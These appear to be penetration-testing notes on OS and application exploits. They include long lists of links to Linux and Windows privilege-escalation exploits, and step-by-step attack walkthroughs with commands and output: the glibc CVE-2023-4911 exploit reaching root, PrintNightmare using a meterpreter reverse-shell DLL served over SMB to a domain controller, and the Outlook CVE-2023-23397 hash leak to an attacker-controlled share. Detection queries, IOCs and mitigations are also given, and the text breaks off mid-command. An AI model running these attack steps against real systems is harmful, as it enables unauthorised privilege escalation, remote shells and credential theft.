# Applications and OS Exploits

These notes contain common OS and vendor specific applications' vulnerabilities, exploitations and whenever applicable their mitigations and methods of patching.

### Finding and working with public exploits

#### Finding the exploit

We can search and find public exploits using either manual search or with Searchsploit.

```
searchsploit keyword
```

Let's say you want to find apache2 exploits

```
searchsploit Apache
```

You can get more information about a specific exploit using below command

```
searchsploit -x exploit-name
```

If you want to display the path of the exploit in order to download

```
searchsploit -w Apache
```

After you have finished searching and selected the exploit, you can copy it to the desired directory in your local machine

```
searchsploit -m exploit-name path-to-your-dir
```

**Other Exploit Resources**

* The Exploit Database

```
https://www.exploit-db.com/
```

* The Rapid7 Vulnerability and Exploit Database

```
https://www.rapid7.com/db/
```

* The National Vulnerability Database

```
https://nvd.nist.gov/
```

* VULDB

```
http://vuldb.com/
```

#### Compiling Exploits

Some exploits come in C format or sometimes you want to convert a python exploit into an executable format. In that case you may need to use compilers.

**Linux**

```
gcc cowroot.c -o cowroot
```

If you needed to specify the arch you can do that below

```
gcc -m32 input.c -o output
gcc -m64 input.c -o output
```

**Windows**

32 bit Windows

```
i686-w64-mingw32-gcc -o main32.exe main.c
```

64 bit Windows

```
x86_64-w64-mingw32-gcc -o main64.exe main.c
```

**Python to EXE**

```
pip3 install pyinstaller
pyinstaller --onefile exploit.py
```

**Cross Compile Exploits**

You may want to run an exploit on both OSs

```
gcc -m32 -o output32 hello.c #(32 bit)

gcc -m64 -o output hello.c # (64 bit)
```

### Common Linux Public Exploits

#### Linux Kernel 2.6.39 < 3.2.2 Privilege Escalation

Download from

```
https://www.exploit-db.com/exploits/18411
```

Make sure to compile it before you exploit

#### Linux Kernel 2.6.22 < 3.9 Privilege Escalation

Download from

```
https://www.exploit-db.com/exploits/40616
```

Make sure to compile it before you exploit

#### Linux Kernel 2.6 Privilege Escalation

Download from

```
https://www.exploit-db.com/exploits/8478
```

Make sure to compile it before you exploit

#### Linux Kernel 3.13.0 < 3.19 Overlayfs Privilege Escalation

```
https://www.exploit-db.com/exploits/37292
```

#### CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8

```
https://www.exploit-db.com/exploits/15285/
```

#### Linux Kernel <= 2.6.37 'Full-Nelson.c'

```
https://www.exploit-db.com/exploits/15704/
```

#### CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)

Download from

```
https://git.zx2c4.com/CVE-2012-0056/about/

wget -O exploit.c <http://www.exploit-db.com/download/18411>
```

Then compile and execute

```
gcc -o mempodipper exploit.c

./mempodippe
```

#### CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

Download from

```
https://dirtycow.ninja/
```

Then compile

```
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
```

#### CVE-2023-4911: Local Privilege Escalation in the glibc's ld.so

**Description** This vulnerability poses a significant risk since it allows escalating the privileges of a logged-on user and obtaining full control of the vulnerable instance. Specifically, this issue could allow a local attacker to use maliciously crafted `GLIBC_TUNABLES` environment variables when launching binaries with SUID permission to execute code with elevated privileges.

This vulnerability is exploited successfully on the default installations of Fedora 37 and 38, Ubuntu 22.04 and 23.04, Debian 12 and 13; other distributions are probably also vulnerable and exploitable (one notable exception is Alpine Linux, which uses musl libc, not the glibc). RHEL-8.5 and onward are vulnerable however RHEL-8.4 and older are not affected by this vulnerability. **Exploitation** A proof of concept `POC` can be found in the link below

```
https://github.com/leesh3288/CVE-2023-4911/blob/main/gen_libc.py
```

First we execute the Python script to generate the malicious `libc.so.6`

```
user@machine:~$ python3 gen_libc.py 

[*] '/lib/x86_64-linux-gnu/libc.so.6' 
Arch: amd64-64-little 
RELRO: Partial 
RELRO Stack: Canary found 
NX: NX enabled 
PIE: PIE enabled
```

Then we compile the exploit

```
user@machine:~$ gcc -o exp exp.c
```

Then we launch the exploit

```
user@machine:~$ ./exp 
try 100 
try 200 
[snip] 
try 3700 
try 3800 
# whoami 
root
```

**Detection** `Through auditd logs`

```
Oct 05 09:15:54 sd-xxxxxx audit[198452]: SYSCALL arch=c000003e syscall=59 success=yes exit=0 a0=7fffe66ad66e a1=7fffe66aa298 a2=559408873a60 a3=7f8f214aee50 items=3 ppid=192010 pid=198452 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=417 comm="su" exe="/usr/bin/su" subj=unconfined key="priv_esc" 

Oct 05 09:15:54 sd-xxxxxx audit: EXECVE argc=2 a0="/usr/bin/su" a1="--help" Oct 05 09:15:54 sd-xxxxxx audit: PATH item=0 name="/usr/bin/su" inode=19796169 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 

Oct 05 09:15:54 sd-xxxxxx audit: PATH item=1 name="/usr/bin/su" inode=19796169 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 

Oct 05 09:15:54 sd-xxxxxx audit: PATH item=2 name="/lib64/ld-linux-x86-64.so.2" inode=19793507 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 

Oct 05 09:15:54 sd-xxxxxx audit: PROCTITLE proctitle=2F7573722F62696E2F7375002D2D68656C70 Oct 05 09:15:54 sd-125732 audit[198452]: ANOM_ABEND auid=1000 uid=1000 gid=1000 ses=417 subj=unconfined pid=198452 comm="su" exe="/usr/bin/su" sig=11 res=1
```

In the above logs we can notice that

* _SYSCALL … syscall=59 … auid=1000 … euid=0_: This line allows us to see that an [EXECVE syscall](https://www.man7.org/linux/man-pages/man2/execve.2.html) (program execution) was done, and that the audit user ID (_loginUID_, _auid=1000_) is different from the effective user ID (_euid=0_). In layman's terms, it means that someone executed a suid binary, or executions via sudo.
* _ANOM\_ABEND … sig=11_: This line means that a process crashed with signal 11, the famous SIGSEGV, segmentation fault. With those two lines, we can detect that a SUID process was invoked, and later crashed or was terminated abnormally. While this scenario is a bit more complex than the one matching kernel logs, it has the advantage of being more generic, potentially allowing detection of exploitation attempts on any privileged binary. **Mitigation** If you can't patch, follow the instructions in the below link for mitigation

```
https://access.redhat.com/security/cve/cve-2023-4911
```

**Remediation** Patching your system is the best and only way to remediate.

### Common Windows Kernel Exploits

* [CVE-2021-33739](https://github.com/mavillon1/CVE-2021-33739-POC) \[Microsoft DWM Core Library Elevation of Privilege Vulnerability] (Windows 10, 20)
* [CVE-2021-1732](https://github.com/KaLendsi/CVE-2021-1732-Exploit) \[Windows Win32k Elevation of Privilege Vulnerability] (Windows 10, 2019/20H2)
* [CVE-2020-0787](https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION) \[Windows Background Intelligent Transfer Service Elevation of Privilege Vulnerability] (Windows 7/8/10, 2008/2012/2016/2019)
* [CVE-2020-0796](https://github.com/danigargu/CVE-2020-0796) \[A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3) protocol handles certain requests, aka 'Windows SMBv3 Client/Server Remote Code Execution Vulnerability'] (Windows 1903/1909)
* [CVE-2019-1458](https://github.com/unamer/CVE-2019-1458) \[An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory] (Windows 7/8/10/2008/2012/2016)
* [CVE-2019-0803](https://github.com/ExpLife0011/CVE-2019-0803) \[An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory] (Windows 7/8/10/2008/2012/2016/2019)
* [CVE-2018-8639](https://github.com/ze0r/CVE-2018-8639-exp) \[An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory] (Windows 7/8/10/2008/2012/2016)
* [CVE-2018-1038](https://gist.github.com/xpn/3792ec34d712425a5c47caf5677de5fe) \[Windows Kernel Elevation of Privilege Vulnerability] (Windows 7 SP1/Windows Server 2008 R2 SP1)
* [CVE-2018-0743](https://github.com/saaramar/execve\_exploit) \[Windows Subsystem for Linux Elevation of Privilege Vulnerability] (Windows 10 version 1703/Windows 10 version 1709/Windows Server version 1709)
* [CVE-2018-8453](https://github.com/ze0r/cve-2018-8453-exp) \[An elevation of privilege vulnerability in Windows Win32k component] (>= windows 8.1)
* [CVE-2018-8440](https://github.com/sourceincite/CVE-2018-8440) \[Windows ALPC Elevation of Privilege Vulnerability] (windows 7/8.1/10/2008/2012/2016)
* [MS17-017](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS17-017) 　\[KB4013081]　　\[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8)
* [CVE-2017-8464](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-8464) 　\[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
* [CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213) 　\[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
* [CVE-2018-0833](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2018-0833) \[SMBv3 Null Pointer Dereference Denial of Service]  (Windows 8.1/Server 2012 R2)
* [CVE-2018-8120](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2018-8120) \[Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1)
* [MS17-010](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS17-010) 　\[KB4013389]　　\[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)
* [MS16-135](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-135) 　\[KB3199135]　　\[Windows Kernel Mode Drivers]　　(2016)
* [MS16-111](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-111) 　\[KB3186973]　　\[kernel api]　　(Windows 10 10586 (32/64)/8.1)
* [MS16-098](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098) 　\[KB3178466]　　\[Kernel Driver]　　(Win 8.1)
* [MS16-075](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075) 　\[KB3164038]　　\[Hot Potato]　　(2003/2008/7/8/2012)
* [MS16-034](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-034) 　\[KB3143145]　　\[Kernel Driver]　　(2008/7/8/10/2012)
* [MS16-032](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-032) 　\[KB3143141]　　\[Secondary Logon Handle]　　(2008/7/8/10/2012)
* [MS16-016](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-016) 　\[KB3136041]　　\[WebDAV]　　(2008/Vista/7)
* [MS16-014](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-014) 　\[K3134228]　　\[remote code execution]　　(2008/Vista/7)
* [MS15-097](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-097) 　\[KB3089656]　　\[remote code execution]　　(win8.1/2012)
* [MS15-076](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-076) 　\[KB3067505]　　\[RPC]　　(2003/2008/7/8/2012)
* [MS15-077](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-077) 　\[KB3077657]　　\[ATM]　　(XP/Vista/Win7/Win8/2000/2003/2008/2012)
* [MS15-061](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-061) 　\[KB3057839]　　\[Kernel Driver]　　(2003/2008/7/8/2012)
* [MS15-051](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051) 　\[KB3057191]　　\[Windows Kernel Mode Drivers]　　(2003/2008/7/8/2012)
* [MS15-015](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-015) 　\[KB3031432]　　\[Kernel Driver]　　(Win7/8/8.1/2012/RT/2012 R2/2008 R2)
* [MS15-010](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-010) 　\[KB3036220]　　\[Kernel Driver]　　(2003/2008/7/8)
* [MS15-001](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-001) 　\[KB3023266]　　\[Kernel Driver]　　(2008/2012/7/8)
* [MS14-070](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-070) 　\[KB2989935]　　\[Kernel Driver]　　(2003)
* [MS14-068](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-068) 　\[KB3011780]　　\[Domain Privilege Escalation]　　(2003/2008/2012/7/8)
* [MS14-058](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-058) 　\[KB3000061]　　\[Win32k.sys]　　(2003/2008/2012/7/8)
* [MS14-066](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-066) 　\[KB2992611]　　\[Windows Schannel Allowing remote code execution] (VistaSP2/7 SP1/8/Windows 8.1/2003 SP2/2008 SP2/2008 R2 SP1/2012/2012 R2/Windows RT/Windows RT 8.1)
* [MS14-040](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-040) 　\[KB2975684]　　\[AFD Driver]　　(2003/2008/2012/7/8)
* [MS14-002](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-002) 　\[KB2914368]　　\[NDProxy]　　(2003/XP)
* [MS13-053](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS13-053) 　\[KB2850851]　　\[win32k.sys]　　(XP/Vista/2003/2008/win 7)
* [MS13-046](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS13-046) 　\[KB2840221]　　\[dxgkrnl.sys]　　(Vista/2003/2008/2012/7)
* [MS13-005](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS13-005) 　\[KB2778930]　　\[Kernel Mode Driver]　　(2003/2008/2012/win7/8)
* [MS12-042](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS12-042) 　\[KB2972621]　　\[Service Bus]　　(2008/2012/win7)
* [MS12-020](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS12-020) 　\[KB2671387]　　\[RDP]　　(2003/2008/7/XP)
* [MS11-080](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-080) 　\[KB2592799]　　\[AFD.sys]　　(2003/XP)
* [MS11-062](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-062) 　\[KB2566454]　　\[NDISTAPI]　　(2003/XP)
* [MS11-046](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046) 　\[KB2503665]　　\[AFD.sys]　　(2003/2008/7/XP)
* [MS11-011](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-011) 　\[KB2393802]　　\[kernel Driver]　　(2003/2008/7/XP/Vista)
* [MS10-092](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-092) 　\[KB2305420]　　\[Task Scheduler]　　(2008/7)
* [MS10-065](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-065) 　\[KB2267960]　　\[FastCGI]　　(IIS 5.1, 6.0, 7.0, and 7.5)
* [MS10-059](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059) 　\[KB982799]　　 \[ACL-Churraskito]　　(2008/7/Vista)
* [MS10-048](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-048) 　\[KB2160329]　　\[win32k.sys]　　(XP SP2 & SP3/2003 SP2/Vista SP1 & SP2/2008 Gold & SP2 & R2/Win7)
* [MS10-015](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-015) 　\[KB977165]　　 \[KiTrap0D]　　(2003/2008/7/XP)
* [MS10-012](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-012) 　\[KB971468]　　\[SMB Client Trans2 stack overflow]　　(Windows 7/2008R2)
* [MS09-050](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS09-050) 　\[KB975517]　　 \[Remote Code Execution]　　(2008/Vista)
* [MS09-020](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS09-020) 　\[KB970483]　　 \[IIS 6.0]　　(IIS 5.1 and 6.0)
* [MS09-012](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS09-012) 　\[KB959454]　　 \[Chimichurri]　　(Vista/win7/2008/Vista)
* [MS08-068](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS08-068) 　\[KB957097]　　 \[Remote Code Execution]　　(2000/XP)
* [MS08-067](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS08-067) 　\[KB958644]　　 \[Remote Code Execution]　　 Remote code execution vulnerability that affects Microsoft Windows 2000, Windows XP, Windows Server 2003, and rated Important for all supported editions of Windows Vista and Windows Server 2008.
* [MS08-066](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS08-066) 　\[KB956803]　　 \[AFD.sys]　　(Windows 2000/XP/Server 2003)
* [MS08-025](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS08-025) 　\[KB941693]　　 \[Win32.sys]　　(XP/2003/2008/Vista)
* [MS06-040](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS06-040) 　\[KB921883]　　 \[Remote Code Execution]　　(2003/xp/2000)
* [MS05-039](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS05-039) 　\[KB899588]　　 \[PnP Service]　　(Win 9X/ME/NT/2000/XP/2003)
* [MS03-026](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS03-026) 　\[KB823980]　　 \[Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003)

#### The PrintNightmare Vulnerability

**IOCs**

**Windows**

* From the task manager in windows, search for the **spoolsv.exe** process launching **rundll32.exe** as a child process without any command-line arguments or with **cmd.exe**, **powershell.exe** as child processes.
* Folder locations: \*_%WINDIR%\system32\spool\drivers\x64\3\*_ and \*_%WINDIR%\system32\spool\drivers\x64\3\Old\*_
* Suspicious DLLs: **MyExploit.dll**, **evil.dll**, **addCube.dll**, **rev.dll**, **rev2.dll**, **main64.dll**, **mimilib.dll**

**Using Splunk SIEM**

**Identifies Print Spooler adding a new Printer Driver**

```
source="WinEventLog:Microsoft-Windows-PrintService/Operational" 
EventCode=316 category = "Adding a printer driver" Message = "*kernelbase.dll,*" Message = "*UNIDRV.DLL,*" Message = "*.DLL.*" 
| stats count min(_time) as firstTime max(_time) as lastTime by OpCode EventCode ComputerName Message
```

**Detects spoolsv.exe with a child process of rundll32.exe**

```
| tstats count min(_time) as firstTime max(_time) as lastTime from 
datamodel=Endpoint.Processes where 
Processes.parent_process_name=spoolsv.exe 
Processes.process_name=rundll32.exe by Processes.dest Processes.user 
Processes.parent_process Processes.process_name Processes.process 
Processes.process_id Processes.parent_process_id
```

**Suspicious rundll32.exe instances without any command-line arguments**

```
| tstats count FROM datamodel=Endpoint.Processes where 
Processes.process_name=spoolsv.exe by _time Processes.process_id Processes.process_name Processes.dest 
| rename "Processes.*" as * 
| join process_guid _time 
    [| tstats count min(_time) as firstTime max(_time) as lastTime FROM datamodel=Endpoint.Filesystem where 
Filesystem.file_path="*\\spool\\drivers\\x64\\*" Filesystem.file_name="*.dll" by _time 
Filesystem.dest Filesystem.file_create_time Filesystem.file_name Filesystem.file_path 
    | rename "Filesystem.*" as * 
    | fields _time dest file_create_time file_name file_path process_name process_path process] 
| dedup file_create_time 
| table dest file_create_time, file_name, file_path, process_name
```

**Detects when a new printer plug-in has failed to load**

```
source="WinEventLog:Microsoft-Windows-PrintService/Admin" ((ErrorCode="0x45A" (EventCode="808" OR EventCode="4909")) 
OR ("The print spooler failed to load a plug-in module" OR "\\drivers\\x64\\")) 
  | stats count min(_time) as firstTime max(_time) as lastTime by OpCode EventCode ComputerName Message
```

**With Windows Event Logs**

```
Microsoft-Windows-PrintService/Operational (Event ID 316)

Microsoft-Windows-PrintService/Admin (Event ID 808)

Microsoft-Windows-PrintService/Operational (Event ID 811)
Microsoft-Windows-SMBClient/Security (Event ID 31017)

Windows System (Event ID 7031)
```

**With Sysmon**

```
Microsoft-Windows-Sysmon/Operational (Event ID 3) - Network connection (Look for suspicious ports)

Microsoft-Windows-Sysmon/Operational (Event ID 11) - FileCreate (File creation events are being logged,  you can look for loaded DLLs in the Print Spooler’s driver directory: _C:\Windows\System32\spool\drivers\x64\3_)

Microsoft-Windows-Sysmon/Operational (Event IDs 23, 26) - FileDelete (You can hunt for deleted malicious DLLs)
```

**Detection**

We can test if the target (domain controller) can be exploited using the below tool from \[impacket]

```
rpcdump.py @target-ip | egrep 'MS-RPRN|MS-PAR'
```

The output that indicates an exploitable target should like below

```
Protocol: [MS-RPRN]: Print System Remote Protocol 

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
```

**Exploitation**

**Cloning the exploit**

```
sudo git clone https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527
```

**Cloning impacket**

```
sudo git clone https://github.com/SecureAuthCorp/impacket
```

**Installing impacket**

```python
python setup.py install
```

**Creating malicious DLL**

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=your-ip LPORT=your-port -f dll -o ~/Desktop/share/malicious.dll
```

**creating a listener using metasploit using the below handler**

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost VALUE
set lport VALUE
```

**Creating an smb server to share the malicious DLL**

Use the native smbserver.py not the one under the impacket repository that we cloned in previous steps.

```
smbserver.py share /root/Desktop/share/ -smb2support
```

native \[smbserver.py] can be installed using the below command

```
sudo apt install impacket
```

**Running the exploit**

```
python CVE-2021-1675.py DC.domain.local/user:pass@DC_IP '\\your-ip\share\malicious.dll'
```

**Mitigation**

The first solution is to run windows updates on all endpoints and servers. The other solution is to disable the printspooler service

**Using Powershell**

```powershell
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```

**Using Group Policy**

This policy will block the remote attack vector by preventing inbound remote printing operations. The system will no longer operate as a print server, but local printing to a directly attached device will still work.

```
Computer Configuration / Administrative Templates / Printers
```

Disable the _“**Allow Print Spooler to accept client connections**”_ policy to block remote attacks then

```
gpupdate /force
```

**Using Registry**

Check the below key

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
```

And make sure it matches the below values

```
NoWarningNoElevationOnInstall = 0
UpdatePromptSettings = 0
```

### Microsoft Products

#### Microsoft Exchange

**CVE-2021-26855 in on-premise Microsoft Exchange server**

**Detection and IOCs**

* Download the test-proxylogon from github
* Launch the command promopt and type the below command to launch exchange management shell

```
<C:\LaunchEMS>
```

* Then launch the below command to start running the tool

```powershell
Get-ExchangeServer | .\Test-ProxyLogon.ps1 -OutPath $home\desktop\logs
```

* Testing the local server only

```powershell
C:.\Test-ProxyLogon.ps1 -OutPath $home\desktop\logs
```

* Checking if the server is compromised manually Look in the following paths

```
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\8Lw7tAhF9i1pJnRo.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\OutlookZH.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\authhead.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\bob.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\current\one1.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\errorPage.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\errorPages.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\fatal-erro.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\log.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\logg.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\logout.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\one.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\one1.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\shel.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\shel2.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\shel90.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\a.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\default.aspx
C:\inetpub\wwwroot\aspnet_client\shell.aspx
C:\inetpub\wwwroot\aspnet_client\Server.aspx
C:\inetpub\wwwroot\aspnet_client\aspnet_client.aspx
C:\inetpub\wwwroot\aspnet_client\aspnet_iisstart.aspx
C:\inetpub\wwwroot\aspnet_client\aspnet_pages.aspx
C:\inetpub\wwwroot\aspnet_client\aspnet_www.aspx
C:\inetpub\wwwroot\aspnet_client\default1.aspx
C:\inetpub\wwwroot\aspnet_client\errorcheck.aspx
C:\inetpub\wwwroot\aspnet_client\iispage.aspx
C:\inetpub\wwwroot\aspnet_client\s.aspx
C:\inetpub\wwwroot\aspnet_client\session.aspx
C:\inetpub\wwwroot\aspnet_client\shell.aspx
C:\inetpub\wwwroot\aspnet_client\system_web\log.aspx
C:\inetpub\wwwroot\aspnet_client\xclkmcfldfi948398430fdjkfdkj.aspx
C:\inetpub\wwwroot\aspnet_client\xx.aspx
C:\inetpub\wwwroot\aspnet_client\Server.aspx
C:\inetpub\wwwroot\aspnet_client\discover.aspx
C:\inetpub\wwwroot\aspnet_client\HttpProxy.aspx
C:\inetpub\wwwroot\aspnet_client\OutlookEN.aspx
C:\inetpub\wwwroot\aspnet_client\supp0rt.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\OAB\log.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\log.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\logg.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\logout.aspx
```

`Testing With nmap`

* Download the below nmap script and store it in /usr/share/nmap/scripts/

```
https://github.com/microsoft/CSS-Exchange/releases/latest/download/http-vuln-cve2021-26855.nse
```

* Execute the below

```
nmap -sV -A [target-ip] --script=http-vuln-cve2021-26855.nse
```

**Mitigation**

* Download the mitigation script below

```
https://github.com/microsoft/CSS-Exchange/releases/latest/download/ExchangeMitigations.ps1
```

* Run the script

```powershell
.\ExchangeMitigations.ps1 -WebSiteNames "Default Web Site" -ApplyAllMitigations -Verbose
```

**Patching** Look in the below link for a list of patches and updates

```
https://techcommunity.microsoft.com/t5/exchange-team-blog/released-march-2021-exchange-server-security-updates/ba-p/2175901
```

**References**

```
https://github.com/microsoft/CSS-Exchange/tree/main/Security
```

#### Microsoft Outlook

**NTLM Leak | CVE-2023-23397**

**Premise**

This vulnerability requires no user interaction to trigger it. Once an infected email arrives in the user's inbox, the attacker can obtain sensitive Net-NTLMv2 credential hashes. Once malicious actors have those hashes, they can get a user's credentials, authenticate to their system and escalate privileges.

**How it works**

This vulnerability can be exploited by creating a malicious outlook appointment and sending it over to the recepient.

On Outlook, it's possible to add reminder notifications when sending calendar invitations. You can specify the audio file played when a user gets a notification reminder for a calendar meeting or event. Typically, this would be used for a user to set up their own notifications by pointing to an audio file.

The attacker must create a malicious calendar invitation that includes a reference to a sound file pointing to a file in a network share in the attacker's machine. Two parameters must be manipulated

```
PidLidReminderFileParameter: Must point to the file hosted in the attacker's network share

Example network share: \\ATTACKER_IP\share\malicious.wav

PidLidReminderOverride: Must be set to true
```

The malicious audio reminder file can also be hosted on a WebDAV-enabled server and therefore the audio file must point to a path similar to the one below

```
\\ATTACKER_IP@80\directory\malicious.wav
```

When the victim receives the malicious email, the UNC path directs them to that SMB share, triggering the vulnerability. This causes the system to start an NTLM authentication process against the attacker's machine, leaking a Net-NTLMv2 hash that the attacker can later try to crack.

**Exploitation Steps**

**Preparing the listener**

We can use `Responder` to emulate an SMB server listening on port 445 to capture the NTLMv2 authentication process

```
responder -I ens5
```

**Installing the required tools**

The OutlookSpy will allow you to access all of Outlook's internal parameters directly, including the reminder's sound file.

**Creating the appointment**

To create an appointment, you will first need to click on the calendar and then on the New Appointment button on the taskbar !\[\[cve-outlook-1.png]] We will create an appointment that includes a reminder set in 0 minutes so that it triggers right after the victim receives it.

**Configuring the appointment with outlookspy plugin**

To view our current appointment from OutlookSpy, click the `OutlookSpy` tab and then the `CurrentItem` button in the taskbar !\[\[cve-outlook-2.png]] From there we need to configure three parameters related to the appointment

* **ReminderPlaySound:** boolean value that indicates if a sound will be played with the reminder.
* **ReminderOverrideDefault**: boolean value that indicates the receiving Outlook client to play the sound pointed by **ReminderSoundFile**, instead of the default one.
* **ReminderSoundFile**: string with the path to the sound file to be used. This will point to a bogus shared folder in the attacker machine.

Then using the script tab, set the parameters to the values shown in the screenshot below (change the path to the malicious sound file according to your environment) !\[\[cve-outlook-3.png]]

Finally, save your appointment to add it to your calendar, making sure the reminder is set to 0 minutes and that the appointment matches the current time and date, as we want it to trigger immediately.

**Automating the exploitation**

All the above steps can be automated using the below powershell script

```
https://github.com/api0cradle/CVE-2023-23397-POC-Powershell/blob/main/CVE-2023-23397.ps1
```

You can also import the exploit's functions with the Import-Module cmdlet. After that, both functions will be available in your current Powershell. To send an email with a malicious appointment, you can just run the following command

```
C:\Users\Administrator\Desktop\> Import-Module .\CVE-2023-23397.ps1 PS 

